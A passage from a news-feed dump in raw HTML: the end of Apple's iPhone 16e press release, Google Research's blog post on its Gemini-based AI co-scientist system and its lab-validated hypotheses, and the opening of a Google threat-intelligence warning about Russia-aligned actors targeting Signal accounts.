                        <div id="gallery-76ed2f2456096dcab6f6f3e15745395f" aria-labelledby="gallery-dotnav-76ed2f2456096dcab6f6f3e15745395f" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:messages-via-satellite">
                                
                                <div>
                                    <div>iPhone 16e offers groundbreaking satellite features, including Messages, Find My, Roadside Assistance, and Emergency SOS via satellite.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Messages-via-satellite-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Messages-via-satellite-250219_inline" aria-label="Download media, Messages via satellite displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-fb08b0775c8a8564358de47c4c0d96dc" aria-labelledby="gallery-dotnav-fb08b0775c8a8564358de47c4c0d96dc" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:emergency-sos-via-satellite">
                                
                                <div>
                                    <div>Emergency SOS via satellite enables users to message with emergency services while outside of cellular and Wi-Fi coverage.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Emergency-SOS-via-satellite-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Emergency-SOS-via-satellite-250219_inline" aria-label="Download media, Emergency SOS via satellite displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-9ef0bdcebc4284b3335f21b1f9e6debb" aria-labelledby="gallery-dotnav-9ef0bdcebc4284b3335f21b1f9e6debb" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:find-my">
                                
                                <div>
                                    <div>When users want to reassure friends and family of their whereabouts while traveling off the grid, they can open the Find My app and share their location via satellite.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Find-My-via-satellite-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Find-My-via-satellite-250219_inline" aria-label="Download media, Find My app via satellite displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-c2e7464af01f9aee9794f49751c3d0a4" aria-labelledby="gallery-dotnav-c2e7464af01f9aee9794f49751c3d0a4" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:roadside-assistance">
                                
                                <div>
                                    <div>Roadside Assistance via satellite can connect users to a roadside assistance provider if they have car trouble while outside of cellular and Wi-Fi coverage.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Roadside-Assistance-via-satellite-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Roadside-Assistance-via-satellite-250219_inline" aria-label="Download media, Roadside Assistance via satellite displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-9a476baaf0e4a5b5fab5c93950abae84" aria-labelledby="gallery-dotnav-9a476baaf0e4a5b5fab5c93950abae84" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:crash-detection">
                                
                                <div>
                                    <div>Crash Detection can detect a severe car crash and automatically dial emergency services when a user is unconscious or unable to reach their iPhone.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Crash-Detection-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Crash-Detection-250219_inline" aria-label="Download media, Crash Detection displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Featuring iOS 18</strong>
</h2>
                 
             
                 <div>iOS 18 makes iPhone 16e more personal, capable, and intelligent than ever.<sup>6</sup> With more customization options, users can give apps and widgets a new dark or tinted look and arrange them in any open space on the Home Screen. The controls at the bottom of the Lock Screen can be customized; Control Center has been redesigned to provide users with easier access to many of the things they use every day, including third-party apps; and new privacy protections include the ability to lock and hide apps to protect sensitive apps and the information inside them. iOS 18 also provides powerful updates for staying connected. In Messages, users can use text effects to bring words, phrases, sentences, and more to life. Tapbacks expand to include emoji, Genmoji, or stickers, and now users can schedule a message to send later. When messaging contacts who do not have an Apple device, the Messages app now supports RCS for richer media and more reliable group messaging when compared to SMS and MMS.
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="iphone-16e-ios-18">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-c198601073d9d47cf5bd3d036cb017d2" href="#gallery-c198601073d9d47cf5bd3d036cb017d2" data-ac-gallery-trigger="gallery-c198601073d9d47cf5bd3d036cb017d2"><span>A customized lock screen on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-677d3b64e77c297635283828eef16f4a" href="#gallery-677d3b64e77c297635283828eef16f4a" data-ac-gallery-trigger="gallery-677d3b64e77c297635283828eef16f4a"><span>A customized Home Screen displayed on iPhone 16e.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-c198601073d9d47cf5bd3d036cb017d2" aria-labelledby="gallery-dotnav-c198601073d9d47cf5bd3d036cb017d2" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:customized-lock-screen">
                                
                                <div>
                                    <div>With iOS 18, users can choose between a light, dark, or tinted look for their app icons to create the experience that is perfect for them.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-iOS-18-customized-icons-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-iOS-18-customized-icons-250219_inline" aria-label="Download media, A customized lock screen on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-677d3b64e77c297635283828eef16f4a" aria-labelledby="gallery-dotnav-677d3b64e77c297635283828eef16f4a" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:customized-home-screen">
                                
                                <div>
                                    <div>The Home Screen can be customized by arranging apps and widgets in any open space.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-iOS-18-customized-Home-Screen-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-iOS-18-customized-Home-Screen-250219_inline" aria-label="Download media, A customized Home Screen displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Better for the Environment</strong>
</h2>
                 
             
                 <div>iPhone 16e is designed with the environment in mind. As part of Apple 2030, the company’s ambitious goal to be carbon neutral across its entire carbon footprint by the end of this decade, Apple is transitioning to renewable electricity for its manufacturing, and investing in wind and solar projects around the world to address the electricity used to charge all Apple products, including iPhone 16e. Today, all Apple facilities run on 100 percent renewable electricity — including the data centers that power Apple Intelligence.
</div>
                 
             
                 <div>To achieve Apple 2030, the company is designing products with more recycled and renewable materials, which further drives down the carbon footprint. iPhone 16e features over 30 percent recycled content overall, including 100 percent recycled cobalt and 95 percent recycled lithium in the battery, 85 percent recycled aluminum in the enclosure, and more.<sup>7</sup> Additionally, the main logic board and back glass of iPhone 16e are designed to be manufactured more efficiently, reducing the amount of raw materials needed. The packaging is also entirely fiber-based, bringing Apple closer to its goal of removing plastic from its packaging by the end of this year.<sup>8</sup>
</div>
                 
             
         </div>
 

    
    
    


     
     
    
    
        <div>
             
                 
                 
             
                 <div><ul>
<li>iPhone 16e will be available in white and black in 128GB, 256GB, and 512GB storage capacities, starting at <strong>$599</strong> (U.S.) or <strong>$24.95</strong> (U.S.) per month for 24 months.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Apple offers great ways to save and upgrade to the latest iPhone. With Apple Trade In, customers can get up to&nbsp;<strong>$120</strong>&nbsp;(U.S.) in credit when they trade in iPhone 11, or up to&nbsp;<strong>$170</strong>&nbsp;(U.S.) in credit when they trade in iPhone 12. With a carrier offer, customers can get&nbsp;up to&nbsp;<strong>$400</strong>&nbsp;(U.S.)&nbsp;in credit when they trade in iPhone 11, or&nbsp;up to<strong>&nbsp;$599&nbsp;</strong>(U.S.) in credit when they trade in iPhone 12 to put toward an iPhone 16e. Customers can take advantage of these offers by visiting the Apple Store online or an Apple Store location. For carrier offer eligibility requirements and more details, see <a href="https://www.apple.com/shop/buy-iphone/carrier-offers/" target="_blank">apple.com/shop/buy-iphone/carrier-offers</a>. To see what their device is worth and for Apple Trade In terms and conditions, customers can visit <a href="https://www.apple.com/shop/trade-in/" target="_blank">apple.com/shop/trade-in</a>.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Customers in 59 countries and regions, including <em>Australia</em>, <em>Canada</em>, <em>China</em>, <em>France</em>, <em>Germany</em>, <em>India</em>, <em>Japan</em>, <em>Malaysia</em>, <em>Mexico</em>, <em>South Korea</em>, <em>Türkiye</em>, the <em>UAE</em>, the<em> UK</em>, and the <em>U.S.</em>, will be able to pre-order iPhone 16e beginning at 5 a.m. PST on Friday, February 21, with availability beginning Friday, February 28.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Apple Intelligence is available in localized English for Australia, Canada, Ireland, New Zealand, South Africa, the UK, and the U.S. Additional languages — including French, German, Italian, Portuguese (Brazil), Spanish, Japanese, Korean, Chinese (simplified), English (Singapore), and English (India) — will be available in April, with more languages coming over the course of the year, including Vietnamese. Some features, applications, and services may not be available in all regions or all languages.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Visual intelligence is available in iOS 18.2 or later on all iPhone 16 models. For more information on visual intelligence, visit <a href="https://support.apple.com/guide/iphone/use-visual-intelligence-with-camera-control-iph12eb1545e/ios/" target="_blank">support.apple.com/guide/iphone</a>.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>iPhone 16e Silicone Case will be available in five colors for<strong> $39</strong> (U.S.): winter blue, fuchsia, lake green, black, and white.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>AppleCare+ for iPhone provides unparalleled service and support. This includes unlimited incidents of accidental damage, battery service coverage, and 24/7 support from the people who know iPhone best. For more information, visit <a href="https://www.apple.com/support/products/iphone/" target="_blank">apple.com/support/products/iphone</a>.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>iCloud+ plans start at just <strong>$0.99</strong> (U.S.) per month and offer up to 12TB of additional storage to keep photos, videos, files, and more safe in the cloud and available across devices. An iCloud+ subscription gives access to premium features such as unlimited event creation in the new Apple Invites app, as well as Private Relay, Hide My Email, and custom email domains. With Family Sharing, users can share their subscription with five other family members at no extra cost.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Customers who purchase iPhone 16e may receive three free months of Apple Music, Apple TV+, Apple Arcade, Apple News+, and Apple Fitness+, with a new subscription. Offer and services availability varies by region. See <a href="https://www.apple.com/promo/" target="_blank">apple.com/promo</a> for details.</li>
</ul>
</div>
                 
             
         </div>
 

    
    
    




    
    
        
    


    
    
    



    
    
    




    




    
    
    





    
    
    <div>
            <ol>
<li>Apple’s satellite features are included for free for two years starting at the time of activation of a new iPhone 14 or later. For Emergency SOS via satellite availability, visit <a href="https://support.apple.com/en-us/HT213426" target="_blank">support.apple.com/en-us/HT213426</a>. Messages via satellite will be available in the U.S. and Canada in iOS 18 or later. SMS availability will depend on carrier. Carrier fees may apply. Users should check with their carrier for details. Roadside Assistance via satellite is currently available in the U.S. with AAA and Verizon Roadside Assistance, and in the UK with Green Flag. Participating roadside assistance providers may charge for services, and iPhone users who are not members can take advantage of their roadside assistance services on a pay-per-use basis. Apple’s satellite features were designed for use in open spaces with a clear line of sight to the sky. Performance may be impacted by obstructions such as trees or surrounding buildings.</li>
<li>iPhone 16e is splash-, water-, and dust-resistant. It was tested under controlled laboratory conditions and has a rating of IP68 under IEC standard 60529 (maximum depth of 6 meters for up to 30 minutes). Splash, water, and dust resistance are not permanent conditions. Resistance might decrease as a result of normal wear. Do not attempt to charge a wet iPhone; refer to the user guide for cleaning and drying instructions. Liquid damage is not covered under warranty.</li>
<li>The display has rounded corners that follow a beautiful curved design, and these corners are within a standard rectangle. When measured as a standard rectangular shape, the screen is 6.06 inches diagonally. The actual viewable area is smaller.</li>
<li>All battery claims depend on the cellular network, location, signal strength, feature configuration, usage, and many other factors; actual results will vary. The battery has limited recharge cycles and may eventually need to be replaced. Battery life and charge cycles vary by use and settings. Battery tests are conducted using specific iPhone units. See <a href="https://www.apple.com/batteries/" target="_blank">apple.com/batteries</a> and <a href="https://www.apple.com/iphone/compare/" target="_blank">apple.com/iphone/compare</a> for more information.</li>
<li>Crash Detection is designed for four-wheel passenger vehicle crashes with certain mass, G-force, and speed profiles consistent with severe, life-threatening crashes. It was designed for severe, life-threatening, high-impact front and rear, side-swipe, T-bone, and rollover crashes. Crash Detection is available worldwide on iPhone 14 or later, Apple Watch Series 8 or later, Apple Watch SE, and Apple Watch Ultra or later.</li>
<li>Some features may not be available for all countries or all areas. For more information on iOS 18, visit <a href="https://www.apple.com/ios/ios-18/" target="_blank">apple.com/ios/ios-18</a>.</li>
<li>All cobalt and lithium references use a mass balance allocation.</li>
<li>Based on retail packaging as shipped by Apple. Breakdown of U.S. retail packaging by weight. Adhesives, inks, and coatings are excluded from calculations of plastic content and packaging weight.</li>
</ol>

        </div>



    
    
    






    

















		
		
			
























		
		

</article>



</section>
</main>


	

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Accelerating scientific breakthroughs with an AI co-scientist (108 pts)]]></title>
            <link>https://research.google/blog/accelerating-scientific-breakthroughs-with-an-ai-co-scientist/</link>
            <guid>43102528</guid>
            <pubDate>Wed, 19 Feb 2025 14:32:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://research.google/blog/accelerating-scientific-breakthroughs-with-an-ai-co-scientist/">https://research.google/blog/accelerating-scientific-breakthroughs-with-an-ai-co-scientist/</a>, See on <a href="https://news.ycombinator.com/item?id=43102528">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-gt-publish-date="20250219">
                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    




    <p data-block-key="685z4">In the pursuit of scientific advances, researchers combine ingenuity and creativity with insight and expertise grounded in literature to generate novel and viable research directions and to guide the exploration that follows. In many fields, this presents a breadth and depth conundrum, since it is challenging to navigate the rapid growth in the rate of scientific publications while integrating insights from unfamiliar domains. Yet overcoming such challenges is critical, as evidenced by the many modern breakthroughs that have emerged from transdisciplinary endeavors. For example, Emmanuelle Charpentier and Jennifer Doudna won the <a href="https://www.nobelprize.org/uploads/2020/10/popular-chemistryprize2020.pdf" target="_blank" rel="noopener noreferrer">2020 Nobel Prize in Chemistry</a> for their work on <a href="https://en.wikipedia.org/wiki/CRISPR" target="_blank" rel="noopener noreferrer">CRISPR</a>, which combined expertise ranging from microbiology to genetics to molecular biology.</p><p data-block-key="bngi7">Motivated by unmet needs in the modern scientific discovery process and building on <a href="https://arxiv.org/abs/2403.05530" target="_blank" rel="noopener noreferrer">recent AI advances</a>, including the ability to synthesize across complex subjects and to perform <a href="https://deepmind.google/technologies/gemini/flash-thinking/" target="_blank" rel="noopener noreferrer">long-term planning and reasoning</a>, we developed an <a href="https://storage.googleapis.com/coscientist_paper/ai_coscientist.pdf" target="_blank" rel="noopener noreferrer">AI co-scientist system</a>. The AI co-scientist is a multi-agent AI system that is intended to function as a collaborative tool for scientists. Built on <a href="https://blog.google/technology/google-deepmind/google-gemini-ai-update-december-2024/" target="_blank" rel="noopener noreferrer">Gemini 2.0, AI co-scientist is</a> designed to mirror the reasoning process underpinning the scientific method. Beyond standard literature review, summarization and “deep research” tools, the AI co-scientist system is intended to uncover new, original knowledge and to formulate demonstrably novel research hypotheses and proposals, building upon prior evidence and tailored to specific research objectives.</p>
</div>

                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h2>Empowering scientists and accelerating discoveries with the AI co-scientist</h2>
            
        
        
    </p>



    <p data-block-key="685z4">Given a scientist’s research goal that has been specified in natural language, the AI co-scientist is designed to generate novel research hypotheses, a detailed research overview, and experimental protocols. To do so, it uses a coalition of specialized agents — <i>Generation</i>, <i>Reflection</i>, <i>Ranking</i>, <i>Evolution</i>, <i>Proximity</i> and <i>Meta-review</i> — that are inspired by the scientific method itself. These agents use automated feedback to iteratively generate, evaluate, and refine hypotheses, resulting in a self-improving cycle of increasingly high-quality and novel outputs.</p>
</div>

                    
                    
    




                    
                    
    


<div>
        
  <p data-block-key="j3yy8">Purpose-built for collaboration, scientists can interact with the system in many ways, including by directly providing their own seed ideas for exploration or by providing feedback on generated outputs in natural language. The AI co-scientist also uses tools, like web-search and specialized AI models, to enhance the grounding and quality of generated hypotheses.</p>

    </div>

                    
                    
    




                    
                    
    


<div>
        
  <p data-block-key="685z4">The AI co-scientist parses the assigned goal into a research plan configuration, managed by a Supervisor agent. The Supervisor agent assigns the specialized agents to the worker queue and allocates resources. This design enables the system to flexibly scale compute and to iteratively improve its scientific reasoning towards the specified research goal.</p>

    </div>

                    
                    
    




                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h2>Scaling test-time compute for advanced scientific reasoning</h2>
            
        
        
    </p>



    <p data-block-key="685z4">The AI co-scientist leverages <a href="https://arxiv.org/abs/2408.03314" target="_blank" rel="noopener noreferrer">test-time compute</a> scaling to iteratively reason, evolve, and improve outputs. Key reasoning steps include <a href="https://deepmind.google/discover/blog/alphago-zero-starting-from-scratch/" target="_blank" rel="noopener noreferrer">self-play</a>–based scientific debate for novel hypothesis generation, ranking tournaments for hypothesis comparison, and an "evolution" process for quality improvement. The system's agentic nature facilitates recursive self-critique, including tool use for feedback to refine hypotheses and proposals.</p><p data-block-key="7ufde">The system's self-improvement relies on the <a href="https://en.wikipedia.org/wiki/Elo_rating_system" target="_blank" rel="noopener noreferrer">Elo</a> auto-evaluation metric derived from its tournaments. Due to their core role, we assessed whether higher Elo ratings correlate with higher output quality. We analyzed the concordance between Elo auto-ratings and <a href="https://arxiv.org/abs/2311.12022" target="_blank" rel="noopener noreferrer">GPQA benchmark</a> accuracy on its diamond set of challenging questions, and we found that higher Elo ratings positively correlate with a higher probability of correct answers.</p>
</div>

                    
                    
    




                    
                    
    


<div>
        
  <p data-block-key="685z4">Seven domain experts curated 15 open research goals and best guess solutions in their field of expertise. Using the automated Elo metric we observed that the AI co-scientist outperformed other state-of-the-art agentic and reasoning models for these complex problems. The analysis reproduced the benefits of scaling test-time compute using inductive biases derived from the scientific method. As the system spends more time reasoning and improving, the self-rated quality of results improve and surpass models and unassisted human experts.</p>

    </div>

                    
                    
    




                    
                    
    




                    
                    
    


<div>
        
  <p data-block-key="685z4">On a smaller subset of 11 research goals, experts assessed the novelty and impact of the AI co-scientist–generated results compared to other relevant baselines; they also provided overall preference. While the sample size was small, experts assessed the AI co-scientist to have higher potential for novelty and impact, and preferred its outputs compared to other models. Further, these human expert preferences also appeared to be concordant with the previously introduced Elo auto-evaluation metric.</p>

    </div>

                    
                    
    




                    
                    
    




                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h2>Validation of novel AI co-scientist hypotheses with real-world laboratory experiments</h2>
            
        
        
    </p>



    <p data-block-key="685z4">To assess the practical utility of the system’s novel predictions, we evaluated end-to-end laboratory experiments probing the AI co-scientist–generated hypotheses and research proposals in three key biomedical applications: drug repurposing, proposing novel treatment targets, and elucidating the mechanisms underlying antimicrobial resistance. These settings all involved expert-in-the-loop guidance and spanned an array of complexities:</p>
</div>

                    
                    
    




                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h3>Drug repurposing for acute myeloid leukaemia</h3>
            
        
        
    </p>



    <p data-block-key="685z4">Drug development is an <a href="https://en.wikipedia.org/wiki/Eroom%27s_law" target="_blank" rel="noopener noreferrer">increasingly time-consuming and expensive process</a> in which new therapeutics require many aspects of the discovery and development process to be restarted for each indication or disease. Drug repurposing addresses this challenge by discovering new therapeutic applications for existing drugs beyond their original intended use. But, due to the complexity of the task, it demands extensive interdisciplinary expertise.</p><p data-block-key="d494o">We applied the AI co-scientist to assist with the prediction of drug repurposing opportunities and, with our partners, validated predictions through computational biology, expert clinician feedback, and <i>in vitro</i> experiments.</p><p data-block-key="18gc5">Notably, the AI co-scientist proposed novel repurposing candidates for <a href="https://en.wikipedia.org/wiki/Acute_myeloid_leukemia" target="_blank" rel="noopener noreferrer">acute myeloid leukemia</a> (AML). Subsequent experiments validated these proposals, confirming that the suggested drugs inhibit tumor viability at clinically relevant concentrations in multiple AML cell lines.</p>
</div>

                    
                    
    




                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h3>Advancing target discovery for liver fibrosis</h3>
            
        
        
    </p>



    <p data-block-key="685z4">Identifying novel treatment targets is more complex than drug repurposing, and often leads to inefficient hypothesis selection and poor prioritization for <i>in vitro</i> and <i>in vivo</i> experiments. AI-assisted target discovery helps to streamline the process of experimental validation, potentially helping to reduce development time costs.</p><p data-block-key="8k4au">We probed the AI co-scientist system's ability to propose, rank, and generate hypotheses and experimental protocols for target discovery hypotheses, focusing on <a href="https://pmc.ncbi.nlm.nih.gov/articles/PMC546435/" target="_blank" rel="noopener noreferrer">liver fibrosis</a>. The AI co-scientist demonstrated its potential by identifying epigenetic targets grounded in preclinical evidence with significant anti-fibrotic activity in <a href="https://pubmed.ncbi.nlm.nih.gov/28878125/" target="_blank" rel="noopener noreferrer">human hepatic organoids</a> (3D, multicellular tissue cultures derived from human cells and designed to mimic the structure and function of the human liver). These findings will be detailed in an upcoming report led by collaborators at Stanford University.</p>
</div>

                    
                    
    




                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h3>Explaining mechanisms of antimicrobial resistance</h3>
            
        
        
    </p>



    <p data-block-key="685z4">As a third validation, we focused on generating hypotheses to explain bacterial gene transfer evolution mechanisms related to antimicrobial resistance (AMR) — microbes' evolved mechanisms to resist infection-treating drugs. This is another complex challenge that involves understanding the molecular mechanisms of gene transfer (<a href="https://www.nature.com/scitable/definition/conjugation-prokaryotes-290/#:~:text=Conjugation%20is%20the%20process%20by,factor%2C%20or%20F%2Dfactor." target="_blank" rel="noopener noreferrer">conjugation</a>, <a href="https://en.wikipedia.org/wiki/Transduction_(genetics)" target="_blank" rel="noopener noreferrer">transduction</a>, and <a href="https://en.wikipedia.org/wiki/Genetic_transformation" target="_blank" rel="noopener noreferrer">transformation</a>) alongside the ecological and evolutionary pressures that drive AMR genes to spread.</p><p data-block-key="9a67g">For this test, expert researchers instructed the AI co-scientist to explore a topic that had already been subject to novel discovery in their group, but had not yet been revealed in the public domain, namely, to explain how <a href="https://pubmed.ncbi.nlm.nih.gov/36596306/" target="_blank" rel="noopener noreferrer">capsid-forming phage-inducible chromosomal islands</a> (cf-PICIs) exist across multiple bacterial species. The AI co-scientist system independently proposed that cf-PICIs interact with diverse phage tails to expand their host range. This<i> in silico</i> discovery, which had been experimentally validated in the original novel laboratory experiments performed prior to use of the AI co-scientist system, are described in co-timed manuscripts (<a href="https://www.biorxiv.org/content/10.1101/2025.02.11.637232v1" target="_blank" rel="noopener noreferrer">1</a>, <a href="https://storage.googleapis.com/coscientist_paper/penades2025ai.pdf" target="_blank" rel="noopener noreferrer">2</a>) with our collaborators at the Fleming Initiative and Imperial College London. This illustrates the value of the AI co-scientist system as an assistive technology, as it was able to leverage decades of research comprising all prior open access literature on this topic.</p>
</div>

                    
                    
    




                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h2>Limitations and outlook</h2>
            
        
        
    </p>



    <p data-block-key="685z4">In our report we address several limitations of the system and opportunities for improvement, including enhanced literature reviews, factuality checking, cross-checks with external tools, auto-evaluation techniques, and larger-scale evaluation involving more subject matter experts with varied research goals. The AI co-scientist represents a promising advance toward AI-assisted technologies for scientists to help accelerate discovery. Its ability to generate novel, testable hypotheses across diverse scientific and biomedical domains — some already validated experimentally — and its capacity for recursive self-improvement with increased compute, demonstrate its potential to accelerate scientists' efforts to address grand challenges in science and medicine. We look forward to responsible exploration of the potential of the AI co-scientist as an assistive tool for scientists. This project illustrates how collaborative and human-centred AI systems might be able to augment human ingenuity and accelerate scientific discovery.</p>
</div>

                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h2>Announcing Trusted Tester access to the AI co-scientist system</h2>
            
        
        
    </p>



    <p data-block-key="685z4">We are excited by the early promise of the AI co-scientist system and believe it is important to evaluate its strengths and limitations in science and biomedicine more broadly. To facilitate this responsibly we will be enabling access to the system for research organizations through a Trusted Tester Program. We encourage interested research organizations around the world to consider joining this program <a href="https://docs.google.com/forms/d/e/1FAIpQLSdvw_8IPrc8O7ZM8FKF46i8BnOYMeSeyLeBNiuk_yGWIlnxYA/viewform" target="_blank" rel="noopener noreferrer">here</a>.</p>
</div>

                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h2>Acknowledgements</h2>
            
        
        
    </p>



    <p data-block-key="685z4"><i>The research described here is a joint effort between many Google Research, Google Deepmind and Google Cloud AI teams. We thank our co-authors at Fleming Initiative and Imperial College London, Houston Methodist Hospital, Sequome, and Stanford University — José R Penadés, Tiago R D Costa, Vikram Dhillon, Eeshit Dhaval Vaishnav, Byron Lee, Jacob Blum and Gary Peltz. We appreciate Subhashini Venugopalan and Yun Liu for their detailed feedback on the manuscripts described here. We are also grateful to the many incredible scientists across institutions providing detailed technical and expert feedback — please refer to our report to see the voices and minds that aided this work. We also thank our teammates Resham Parikh, Taylor Goddu, Siyi Kou, Rachelle Sico, Amanda Ferber, Cat Kozlowski, Alison Lentz, KK Walker, Roma Ruparel, Jenn Sturgeon, Lauren Winer, Juanita Bawagan, Tori Milner, MK Blake, Kalyan Pamarthy for their support</i>.<i> Finally, we also thank John Platt, Michael Brenner, Zoubin Ghahramani, Dale Webster, Joelle Barral, Michael Howell, Susan Thomas, Jason Freidenfelds, Karen DeSalvo, Vladimir Vuskovic, Greg Corrado, Ronit Levavi Morad, Ali Eslami, Anna Koivuniemi, Royal Hansen, Andy Berndt, Noam Shazeer, Oriol Vinyals, Burak Gokturk, Amin Vahdat, Katherine Chou, Avinatan Hassidim, Koray Kavukcuoglu, Pushmeet Kohli, Yossi Matias, James Manyika, Jeff Dean and Demis Hassabis for their support.</i></p>
</div>

                    
                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Multiple Russia-aligned threat actors actively targeting Signal Messenger (131 pts)]]></title>
            <link>https://cloud.google.com/blog/topics/threat-intelligence/russia-targeting-signal-messenger</link>
            <guid>43102284</guid>
            <pubDate>Wed, 19 Feb 2025 14:05:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://cloud.google.com/blog/topics/threat-intelligence/russia-targeting-signal-messenger">https://cloud.google.com/blog/topics/threat-intelligence/russia-targeting-signal-messenger</a>, See on <a href="https://news.ycombinator.com/item?id=43102284">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h5>Google Threat Intelligence Group </h5></div><div jsname="tx2NYc"><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p>Written by: Dan Black</p>
<hr></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p><span>Google Threat Intelligence Group (GTIG) has observed increasing efforts from several Russia state-aligned threat actors to compromise Signal Messenger accounts used by individuals of interest to Russia's intelligence services. While this emerging operational interest has likely been sparked by wartime demands to gain access to sensitive government and military communications in the context of Russia's re-invasion of Ukraine, we anticipate the tactics and methods used to target Signal will grow in prevalence in the near-term and proliferate to additional threat actors and regions outside the Ukrainian theater of war.</span></p>
<p><span>Signal's popularity among common targets of surveillance and espionage activity—such as military personnel, politicians, journalists, activists, and other at-risk communities—has positioned the secure messaging application as a high-value target for adversaries seeking to intercept sensitive information that could fulfil a range of different intelligence requirements. More broadly, this threat also extends to other popular messaging applications such as WhatsApp and Telegram, which are also being actively targeted by Russian-aligned threat groups using similar techniques. In anticipation of a wider adoption of similar tradecraft by other threat actors, we are issuing a public warning regarding the tactics and methods used to date to help build public awareness and help communities better safeguard themselves from similar threats.</span></p>
